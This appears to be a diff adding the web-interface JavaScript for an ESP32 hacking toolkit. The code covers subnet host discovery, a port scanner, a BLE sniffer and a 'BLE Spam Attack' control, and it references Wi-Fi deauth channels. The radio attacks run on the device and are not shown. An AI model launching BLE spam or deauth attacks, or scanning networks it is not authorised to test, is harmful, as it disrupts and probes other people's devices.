+            if (/tuya|espressif|shenzhen|meross|sonoff|shelly|itead|china dragon/.test(vendor)) {
+                return 'iot';
+            }
+            return 'device';
+        }
+
+        // Friendly label for a service badge - shown directly on the row,
+        // no hover needed.
+        function friendlyServiceLabel(s) {
+            if (s.source === 'mdns') {
+                const map = {
+                    '_googlecast._tcp': 'Cast', '_airplay._tcp': 'AirPlay', '_raop._tcp': 'AirPlay Audio',
+                    '_ipp._tcp': 'Printer', '_http._tcp': 'HTTP', '_https._tcp': 'HTTPS',
+                    '_smb._tcp': 'SMB', '_ssh._tcp': 'SSH', '_afpovertcp._tcp': 'AFP'
+                };
+                const key = (s.type || '').toLowerCase().replace('.local', '').replace(/\.$/, '');
+                if (map[key]) return map[key];
+                return (s.type || 'mDNS').replace(/^_/, '').replace(/\._tcp.*$/i, '').replace(/\._udp.*$/i, '') || 'mDNS';
+            }
+            const map = {
+                'internetgatewaydevice': 'Router', 'wanconnectiondevice': 'Router', 'wandevice': 'Router', 'lanconnectiondevice': 'Router',
+                'mediarenderer': 'Media Renderer', 'mediaserver': 'Media Server', 'basicdevice': 'UPnP Device'
+            };
+            const key = (s.type || '').toLowerCase();
+            return map[key] || s.type || 'UPnP';
+        }
+
+        function escapeHtml(str) {
+            return String(str ?? '').replace(/[&<>"']/g, c => ({
+                '&': '&amp;', '<': '&lt;', '>': '&gt;', '"': '&quot;', "'": '&#39;'
+            })[c]);
+        }
+
+        // Numeric IPv4 sort key - plain string sort would put "192.168.1.10"
+        // before "192.168.1.2", so compare the dotted quad as one number instead.
+        function ipToSortKey(ip) {
+            const parts = (ip || '').split('.').map(Number);
+            if (parts.length !== 4 || parts.some(n => Number.isNaN(n))) return -1;
+            return ((parts[0] << 24) | (parts[1] << 16) | (parts[2] << 8) | parts[3]) >>> 0;
+        }
+
+        function clearHostScan() {
+            hostScanData = [];
+            document.getElementById('hd-filter').value = '';
+            document.getElementById('host-scan-body').innerHTML = '<div class="host-empty">Cleared</div>';
+            document.getElementById('hd-stat-hosts').textContent = '--';
+            document.getElementById('hd-stat-services').textContent = '--';
+            document.getElementById('hd-stat-vendors').textContent = '--';
+        }
+
+        function renderHostScanTable() {
+            const container = document.getElementById('host-scan-body');
+            const filterVal = document.getElementById('hd-filter').value.trim().toLowerCase();
+
+            const filtered = !filterVal ? hostScanData : hostScanData.filter(host =>
+                (host.ip || '').toLowerCase().includes(filterVal) ||
+                (host.mac || '').toLowerCase().includes(filterVal) ||
+                (host.hostname || '').toLowerCase().includes(filterVal) ||
+                (host.vendor || '').toLowerCase().includes(filterVal) ||
+                (host.friendly_name || '').toLowerCase().includes(filterVal) ||
+                (host.model || '').toLowerCase().includes(filterVal)
+            );
+
+            container.innerHTML = '';
+
+            if (filtered.length === 0) {
+                container.innerHTML = '<div class="host-empty">Nessun host trovato</div>';
+                return;
+            }
+
+            filtered.forEach(host => {
+                const row = document.createElement('div');
+                row.className = 'host-row';
+
+                const iconKey = classifyHostIcon(host);
+                const vendorName = (host.vendor && host.vendor !== "Unknown Vendor") ? host.vendor : "Unknown Vendor";
+                const hasFriendly = !!(host.friendly_name && host.friendly_name.trim());
+                const hasHostname = host.hostname && host.hostname !== "N/A";
+                // friendly_name comes from the device's own UPnP description
+                // (its self-reported name, e.g. "Fire TV di Stefano") - the
+                // most trustworthy source when present, ahead of the DNS/mDNS
+                // hostname and far ahead of a bare vendor guess.
+                const primaryName = hasFriendly ? host.friendly_name : (hasHostname ? host.hostname : vendorName);
+
+                const subBits = [];
+                if (hasFriendly) {
+                    const modelBits = [host.manufacturer, host.model].filter(Boolean).join(' ');
+                    subBits.push(modelBits || vendorName);
+                } else if (hasHostname) {
+                    subBits.push(vendorName);
+                }
+                if (host.mac && host.mac !== "N/A") subBits.push(host.mac);
+
+                const icon = document.createElement('div');
+                icon.className = 'host-icon';
+                icon.innerHTML = HOST_DEVICE_ICONS[iconKey]; // Only static, locally-defined SVG markup.
+                const info = document.createElement('div');
+                info.className = 'host-info';
+                const name = document.createElement('div'); name.className = 'host-name'; name.textContent = primaryName;
+                const sub = document.createElement('div'); sub.className = 'host-sub'; sub.textContent = subBits.join(' · ');
+                info.append(name, sub);
+                const badges = document.createElement('div'); badges.className = 'host-badges';
+                (host.services || []).forEach(service => {
+                    const label = document.createElement('span'); label.className = 'host-badge';
+                    label.textContent = friendlyServiceLabel(service);
+                    label.title = service.source === 'mdns'
+                        ? `${service.name && service.name !== 'N/A' ? service.name : service.type} : ${service.port}`
+                        : (service.server && service.server !== 'N/A' ? service.server : (service.location || ''));
+                    badges.appendChild(label);
+                });
+                if (badges.childElementCount) info.appendChild(badges);
+                const ipBox = document.createElement('div'); ipBox.className = 'host-ip';
+                const ip = document.createElement('div'); ip.className = 'host-ip-addr'; ip.textContent = String(host.ip || '');
+                const useButton = document.createElement('button'); useButton.className = 'secondary host-use-btn';
+                useButton.textContent = 'USE';
+                useButton.addEventListener('click', () => {
+                    document.getElementById('ps-ip').value = String(host.ip || '');
+                    showToast(`IP ${String(host.ip || '')} copied to Port Scanner.`);
+                });
+                ipBox.append(ip, useButton);
+                row.append(icon, info, ipBox);
+                container.appendChild(row);
+            });
+        }
+
+        function updateHostScanStats() {
+            const total = hostScanData.length;
+            const withServices = hostScanData.filter(h => h.services && h.services.length > 0).length;
+            const vendors = new Set(
+                hostScanData.map(h => h.vendor).filter(v => v && v !== "Unknown Vendor" && v !== "Randomized MAC")
+            ).size;
+
+            document.getElementById('hd-stat-hosts').textContent = total;
+            document.getElementById('hd-stat-services').textContent = withServices;
+            document.getElementById('hd-stat-vendors').textContent = vendors;
+            document.getElementById('hd-stat-time').textContent = new Date().toLocaleTimeString([], {hour:'2-digit', minute:'2-digit'});
+        }
+
+        async function startHostScan() {
+            const container = document.getElementById('host-scan-body');
+            const includeMdns = document.getElementById('hd-include-mdns').checked;
+            const includeSsdp = document.getElementById('hd-include-ssdp').checked;
+
+            container.innerHTML = '<div class="host-empty" style="color:var(--accent); font-style:normal;">Subnet scan in progress (this may take a while)...</div>';
+
+            try {
+                const res = await sendCommand(CMD.HOST_DISCOVERY, {
+                    include_mdns: includeMdns,
+                    include_ssdp: includeSsdp
+                });
+
+                hostScanData = (res.data || []).sort((a, b) => ipToSortKey(a.ip) - ipToSortKey(b.ip));
+                renderHostScanTable();
+                updateHostScanStats();
+
+                showToast("Subnet Sweep Completato!");
+                log(`Trovati ${hostScanData.length} host nella rete.`, "success");
+
+            } catch (err) {
+                container.innerHTML = '<div class="host-empty" style="color:var(--danger); font-style:normal;">Errore durante la scansione</div>';
+                showToast("Errore Host Discovery");
+                log("Errore chiamata API Host Discovery: " + err, "error");
+            }
+        }
+
+        // ==========================================
+        // PORT SCANNER LOGIC
+        // ==========================================
+        let isPortScanRunning = false;
+
+        function toggleCustomPorts() {
+            const val = document.getElementById('ps-ports-preset').value;
+            const container = document.getElementById('custom-ports-container');
+            if(val === 'custom') {
+                container.style.display = 'block';
+            } else {
+                container.style.display = 'none';
+            }
+        }
+
+        function getPortList() {
+            let preset = document.getElementById('ps-ports-preset').value;
+            
+            if(preset === 'top20') {
+                return [21, 22, 23, 25, 53, 80, 110, 111, 135, 139, 143, 443, 445, 993, 995, 1723, 3306, 3389, 5900, 8080];
+            }
+            if(preset === 'top100') {
+                // Selezione delle porte TCP/UDP più lette e scansionate su Nmap
+                return [
+                    20, 21, 22, 23, 25, 53, 67, 68, 69, 80, 110, 111, 119, 123, 135, 137, 138, 139, 143, 161, 
+                    162, 389, 443, 445, 465, 500, 514, 515, 548, 587, 631, 873, 902, 990, 993, 995, 1025, 1026, 
+                    1080, 1194, 1433, 1521, 1720, 1723, 2000, 2049, 2082, 2083, 2121, 2222, 2601, 2604, 3128, 
+                    3306, 3389, 3690, 4899, 5000, 5009, 5050, 5060, 5101, 5190, 5357, 5432, 5631, 5666, 5800, 
+                    5900, 5901, 5938, 6000, 6646, 7070, 7443, 7990, 8000, 8008, 8009, 8080, 8081, 8443, 8888, 
+                    9000, 9090, 9100, 9999, 10000, 32768, 49152
+                ];
+            }
+            if(preset === 'iot') {
+                return [21, 22, 23, 80, 443, 1883, 5683, 8080, 8443, 3702, 1900, 554, 8000, 37777];
+            }
+            if(preset === 'custom') {
+                let raw = document.getElementById('ps-custom-ports').value;
+                if(!raw) return [];
+                
+                let ports = [];
+                let parts = raw.split(','); // Divide per virgola
+                
+                for(let part of parts) {
+                    part = part.trim();
+                    if(!part) continue;
+                    
+                    // Se contiene un trattino, processa come Range
+                    if(part.includes('-')) {
+                        let range = part.split('-');
+                        let start = parseInt(range[0].trim());
+                        let end = parseInt(range[1].trim());
+                        
+                        if(!isNaN(start) && !isNaN(end) && start <= end) {
+                            for(let p = start; p <= end; p++) {
+                                ports.push(p);
+                            }
+                        }
+                    } else {
+                        // Altrimenti è una porta singola
+                        let p = parseInt(part);
+                        if(!isNaN(p)) ports.push(p);
+                    }
+                }
+                return [...new Set(ports)].filter(p => p > 0 && p <= 65535);
+            }
+            return [];
+        }
+
+        async function startPortScan() {
+            const ip = document.getElementById('ps-ip').value.trim();
+            if(!ip) { showToast("Error: Insert Target IP"); return; }
+            
+            const ports = getPortList();
+            if(!ports || ports.length === 0) { showToast("Error: Invalid or empty port list"); return; }
+            
+            // Protezione Anti-Crash del browser
+            if(ports.length > 2000) {
+                if(!confirm(`WARNING: You are about to scan ${ports.length} ports. This will take a long time and might freeze the browser. Proceed?`)) {
+                    return;
+                }
+            }
+            
+            const methodSelect = document.getElementById('ps-method');
+            const method = parseInt(methodSelect.value);
+            const methodName = methodSelect.options[methodSelect.selectedIndex].text;
+            
+            const term = document.getElementById('ps-terminal');
+            
+            // Pulisce il terminale
+            term.innerHTML = `<div style="color:var(--accent)">Starting ${methodName} on ${ip} (${ports.length} ports)...</div>`;
+            
+            isPortScanRunning = true;
+            const btnStart = document.getElementById('btn-ps-start');
+            const btnStop = document.getElementById('btn-ps-stop');
+            
+            btnStart.disabled = true; btnStart.style.opacity = "0.5"; btnStart.style.cursor = "not-allowed";
+            btnStop.disabled = false; btnStop.style.opacity = "1"; btnStop.style.cursor = "pointer";
+            
+            let closedCount = 0; // Contatore per le porte chiuse
+
+            // Loop Sequenziale per ogni porta
+            for(let i = 0; i < ports.length; i++) {
+                if(!isPortScanRunning) {
+                    term.innerHTML += `<div style="color:var(--warning)">Scan aborted by user.</div>`;
+                    term.scrollTop = term.scrollHeight;
+                    break;
+                }
+
+                const port = ports[i];
+                
+                // Cerca il nome del servizio nel dizionario
+                const serviceName = PORT_SERVICES[port] ? `(${PORT_SERVICES[port]})` : "";
+                
+                // Div temporaneo di attesa
+                const waitDiv = document.createElement('div');
+                waitDiv.style.color = '#aaa';
+                waitDiv.innerText = `Scanning port ${port}...`;
+                term.appendChild(waitDiv);
+                term.scrollTop = term.scrollHeight;
+                
+                try {
+                    // Manda il comando WebSocket per l'ESATTA porta corrente
+                    const res = await sendCommand(CMD.PORT_SCAN_SINGLE, { 
+                        ip: ip, 
+                        port: port, 
+                        method: method 
+                    });
+                    
+                    // Se la porta è CHIUSA, nascondi l'output e salta al prossimo giro
+                    if (res.status_code === 1) { 
+                        waitDiv.remove();
+                        closedCount++;
+                        continue; 
+                    }
+
+                    // 0=PORT_OPEN, 2=PORT_FILTERED, 3=PORT_ERROR
+                    let statusColor = '#ffab40';
+                    let statusText = 'UNKNOWN';
+                    
+                    if (res.status_code === 0) { 
+                        statusColor = '#00e676'; 
+                        statusText = 'OPEN'; 
+                    }
+                    else if (res.status_code === 2) { 
+                        statusColor = '#ffab40'; 
+                        statusText = 'FILTERED'; 
+                    }
+                    else { 
+                        statusColor = 'var(--danger)'; 
+                        statusText = 'ERROR'; 
+                    }
+
+                    waitDiv.innerHTML = `Port <span style="color:white; font-weight:bold; display:inline-block; width:45px;">${port}</span> <span style="color:${statusColor}; font-weight:bold; width:150px; display:inline-block;">[${statusText}]</span> <span style="color:#888; font-style:italic;">${serviceName}</span>`;
+                    
+                } catch(e) {
+                    waitDiv.innerHTML = `Port <span style="color:white; font-weight:bold; display:inline-block; width:45px;">${port}</span> <span style="color:var(--danger); width:150px; display:inline-block;">[ERROR]</span> <span style="color:#888; font-style:italic;">${serviceName}</span>`;
+                }
+            }
+            
+            if(isPortScanRunning) {
+                let summary = `<div style="color:var(--accent); margin-top:10px;">Scan completed.`;
+                if (closedCount > 0) {
+                    summary += ` <span style="color:#888; font-style:italic;">(${closedCount} closed ports hidden)</span>`;
+                }
+                summary += `</div>`;
+                
+                term.innerHTML += summary;
+                term.scrollTop = term.scrollHeight;
+            }
+            
+            isPortScanRunning = false;
+            btnStart.disabled = false; btnStart.style.opacity = "1"; btnStart.style.cursor = "pointer";
+            btnStop.disabled = true; btnStop.style.opacity = "0.5"; btnStop.style.cursor = "not-allowed";
+        }
+
+        function stopPortScan() {
+            isPortScanRunning = false;
+            showToast("Stopping port scan...");
+        }
+
+        // ==========================================
+        // BLE SNIFFER LOGIC (POLLING)
+        // ==========================================
+        let isBleScanning = false;
+        let blePollingInterval = null;
+
+        async function startBleSniffer() {
+            log("Starting BLE Scanner...", "info");
+            const btnStart = document.getElementById('btn-ble-start');
+            const btnStop = document.getElementById('btn-ble-stop');
+
+            try {
+                await sendCommand(CMD.START_BLE_SNIFFER);
+                isBleScanning = true;
+                showToast("BLE Scanner Started");
+
+                btnStart.disabled = true; btnStart.style.opacity = "0.5"; btnStart.style.cursor = "not-allowed";
+                btnStop.disabled = false; btnStop.style.opacity = "1"; btnStop.style.cursor = "pointer";
+                
+                // Avvia il polling ogni 2 secondi
+                if (blePollingInterval) clearInterval(blePollingInterval);
+                blePollingInterval = setInterval(fetchBleDevices, 2000);
+
+            } catch (err) {
+                showToast("Error starting BLE scanner");
+                log("BLE Scanner Start Error: " + err, "error");
+            }
+        }
+
+        async function stopBleSniffer() {
+            log("Stopping BLE Scanner...", "warning");
+            const btnStart = document.getElementById('btn-ble-start');
+            const btnStop = document.getElementById('btn-ble-stop');
+
+            try {
+                await sendCommand(CMD.STOP_BLE_SNIFFER);
+                isBleScanning = false;
+                showToast("BLE Scanner Stopped");
+
+                // Ferma il polling
+                if (blePollingInterval) {
+                    clearInterval(blePollingInterval);
+                    blePollingInterval = null;
+                }
+
+                btnStart.disabled = false; btnStart.style.opacity = "1"; btnStart.style.cursor = "pointer";
+                btnStop.disabled = true; btnStop.style.opacity = "0.5"; btnStop.style.cursor = "not-allowed";
+            } catch (err) {
+                log("BLE Scanner Stop Error: " + err, "error");
+            }
+        }
+
+        async function clearBleTable() {
+            try {
+                await sendCommand(CMD.BLE_DEVICES_CLEAR);
+                showToast("BLE Scanner Devices Cleared");
+            } catch (err) {
+                log("BLE Scanner Devices Clear Error: " + err, "error");
+            }
+            document.getElementById('ble-body').innerHTML = '<tr><td colspan="7" style="text-align:center; padding: 20px; color:#666;">Ready to scan BLE devices...</td></tr>';
+            document.getElementById('ble-device-count').innerText = "0";
+        }
+
+        function fetchBleDevices() {
+            if (isBleScanning && document.getElementById('view-ble').classList.contains('active')) {
+                sendCommand(CMD.GET_BLE_DEVICES)
+                    .then(res => handleBleDevices(res)) // <-- AGGIUNGI QUESTA RIGA
+                    .catch(e => console.log("BLE fetch error", e));
+            }
+        }
+
+        // ==========================================
+        // BLE SPAM LOGIC
+        // ==========================================
+        let isBleSpamming = false;
+
+        async function startBleSpam() {
+            const typeSelect = document.getElementById('ble-spam-type');
+            const typeVal = parseInt(typeSelect.value);
+            const typeName = typeSelect.options[typeSelect.selectedIndex].text;
+
+            log(`Starting BLE Spam... Target: ${typeName}`, "warning");
+            
+            const btnStart = document.getElementById('btn-ble-spam-start');
+            const btnStop = document.getElementById('btn-ble-spam-stop');
+
+            try {
+                // Invia il comando al C con il parametro 'type' corrispondente al tuo enum ble_spam_vendor_t
+                const res = await sendCommand(CMD.START_BLE_SPAM, { type: typeVal });
+                if (res.status === 'ok') {
+                    isBleSpamming = true;
+                    showToast("BLE Spam Attack Started!");
+
+                    btnStart.disabled = true; btnStart.style.opacity = "0.5"; btnStart.style.cursor = "not-allowed";
+                    btnStop.disabled = false; btnStop.style.opacity = "1"; btnStop.style.cursor = "pointer";
+                    typeSelect.disabled = true;
+                } else {
+                    showToast(res.message || "Failed to start BLE Spam");
+                    log("BLE Spam Start Error: " + (res.message || "unknown"), "error");
+                }
+            } catch (err) {
+                showToast("Error starting BLE Spam");
+                log("BLE Spam Start Error: " + err, "error");
+            }
+        }
+
+        async function stopBleSpam() {
+            log("Stopping BLE Spam...", "info");
+            const btnStart = document.getElementById('btn-ble-spam-start');
+            const btnStop = document.getElementById('btn-ble-spam-stop');
+            const typeSelect = document.getElementById('ble-spam-type');
+
+            try {
+                await sendCommand(CMD.STOP_BLE_SPAM);
+                isBleSpamming = false;
+                showToast("BLE Spam Stopped");
+
+                btnStart.disabled = false; btnStart.style.opacity = "1"; btnStart.style.cursor = "pointer";
+                btnStop.disabled = true; btnStop.style.opacity = "0.5"; btnStop.style.cursor = "not-allowed";
+                typeSelect.disabled = false;
+            } catch (err) {
+                log("BLE Spam Stop Error: " + err, "error");
+            }
+        }
+        
+        // Funzione per mappare l'array posizionale proveniente dall'ESP32
+        function handleBleDevices(msg) {
+            if(!msg.devices) return;
+
+            const tbody = document.getElementById('ble-body');
+            tbody.innerHTML = '';
+
+            const minRssi = parseInt(document.getElementById('ble-filter-rssi').value) || -100;
+            const fMac = document.getElementById('ble-filter-mac').value.trim().toUpperCase();
+            const fNameData = document.getElementById('ble-filter-name').value.trim().toLowerCase();
+
+            let visibleCount = 0;
+            
+            // L'array ora è: [mac, rssi, name, vendor, label, serial, pkts, seconds_ago, data]
+            msg.devices.sort((a, b) => b[1] - a[1]).forEach(row => {
+                const mac = row[0];
+                const rssi = row[1];
+                const name = row[2];
+                const vendor = row[3];
+                const label = row[4];
+                const serial = row[5];
+                const pkts = row[6];
+                const secondsAgo = row[7];
+                const dataHex = row[8];
+
+                // Applica i filtri
+                if(rssi < minRssi) return;
+                if(fMac && !mac.includes(fMac)) return;
+                if(fNameData && !String(name || '').toLowerCase().includes(fNameData) && !String(vendor || '').toLowerCase().includes(fNameData)) return;
+
+                visibleCount++;
+
+                const tr = document.createElement('tr');
+                let rssiColor = rssi > -60 ? "#0f0" : (rssi > -80 ? "#ffab40" : "#ff5252");
+                
+                let badgeBg = "#222", badgeColor = "#aaa", badgeBorder = "transparent";
+                const lbl = label.toLowerCase();
+                if (lbl.includes("flipper") || lbl.includes("camera") || lbl.includes("airtag")) {
+                    badgeBg = "rgba(255, 82, 82, 0.15)"; badgeColor = "var(--danger)"; badgeBorder = "var(--danger)";
+                } else if (lbl.includes("tile") || lbl.includes("smarttag") || lbl.includes("chipolo") || lbl.includes("find my")) {
+                    badgeBg = "rgba(0, 230, 118, 0.15)"; badgeColor = "var(--accent)"; badgeBorder = "var(--accent)";
+                } else if (lbl.includes("apple") || lbl.includes("google") || lbl.includes("samsung")) {
+                    badgeBg = "rgba(255, 171, 64, 0.15)"; badgeColor = "#ffab40"; badgeBorder = "#ffab40";
+                }
+
+                let lastSeenStr = secondsAgo <= 2 ? "Active" : `${secondsAgo}s ago`;
+
+                const macCell = document.createElement('td');
+                macCell.style.cssText = 'color:var(--accent); font-weight:bold; font-family:monospace; white-space: nowrap;';
+                macCell.textContent = String(mac == null ? '' : mac);
+                const rssiCell = document.createElement('td');
+                rssiCell.style.cssText = `color:${rssiColor}; font-weight:bold;`;
+                rssiCell.textContent = String(rssi);
+                const identityCell = document.createElement('td');
+                const nameDiv = document.createElement('div');
+                nameDiv.style.cssText = name !== '' ? 'color:#fff; font-weight:bold;' : 'color:#888; font-style:italic;';
+                nameDiv.textContent = name !== '' ? String(name) : '<No Name>';
+                const vendorDiv = document.createElement('div');
+                vendorDiv.style.cssText = 'color:#888; font-size:0.7rem;';
+                vendorDiv.textContent = String(vendor == null ? '' : vendor);
+                identityCell.append(nameDiv, vendorDiv);
+                const labelCell = document.createElement('td');
+                const labelSpan = document.createElement('span');
+                labelSpan.style.cssText = `background:${badgeBg}; color:${badgeColor}; border:1px solid ${badgeBorder}; padding:3px 6px; border-radius:4px; font-size:0.7rem; font-weight:bold; display:inline-block;`;
+                labelSpan.textContent = String(label == null ? '' : label);
+                labelCell.appendChild(labelSpan);
+                const pktsCell = document.createElement('td'); pktsCell.textContent = String(pkts);
+                const seenCell = document.createElement('td'); seenCell.textContent = lastSeenStr;
+                const extraCell = document.createElement('td');
+                extraCell.textContent = serial !== '' ? `SN: ${serial}` : String(dataHex == null ? '' : dataHex);
+                tr.append(macCell, rssiCell, identityCell, labelCell, pktsCell, seenCell, extraCell);
+                tbody.appendChild(tr);
+            });
+
+            document.getElementById('ble-device-count').innerText = visibleCount;
+        }
+
+        // ==========================================
+        // INIT
+        // ==========================================
+        document.addEventListener('DOMContentLoaded', () => {
+            initLanguage();
+            buildMobileNav();
+            updateAttackTypeDesc();
+            populateChannels();
+            populateReconChannels();
+            populateDeauthChannels();
+            log("System UI Initialized.");
+            setTimeout(connectWS, 1000);
+        });
+
+        // ---- Magpie-style shell helpers ----
+        function buildMobileNav() {
+            const nav = document.getElementById('mobile-nav');
+            if (!nav) return;
+            nav.replaceChildren();
+            document.querySelectorAll('button.nav-item').forEach(item => {
+                const btn = document.createElement('button');
+                btn.type = 'button';
+                const label = item.querySelector('span');
+                btn.textContent = label ? label.textContent : '';
+                btn.dataset.view = item.dataset.view || '';
+                btn.addEventListener('click', () => showView(btn.dataset.view, item));
+                nav.appendChild(btn);
+            });
+            const active = document.querySelector('button.nav-item.active');
+            if (active) {
+                nav.querySelectorAll('button').forEach(b => b.classList.toggle('active', b.dataset.view === active.dataset.view));
+            }
+        }
+
+        function toggleTheme() {
+            const root = document.documentElement;
+            const dark = root.getAttribute('data-theme') !== 'dark';
+            root.setAttribute('data-theme', dark ? 'dark' : 'light');
+            try { localStorage.setItem('esp32_theme', dark ? 'dark' : 'light'); } catch (e) {}
+        }
+
+        function setSideStatus(online) {
+            const el = document.getElementById('side-status');
+            const txt = document.getElementById('side-status-text');
+            if (el) el.classList.toggle('on', !!online);
+            if (txt) txt.textContent = online ? 'Online' : 'Offline';
+        }
+</script>
+</body>
+</html>
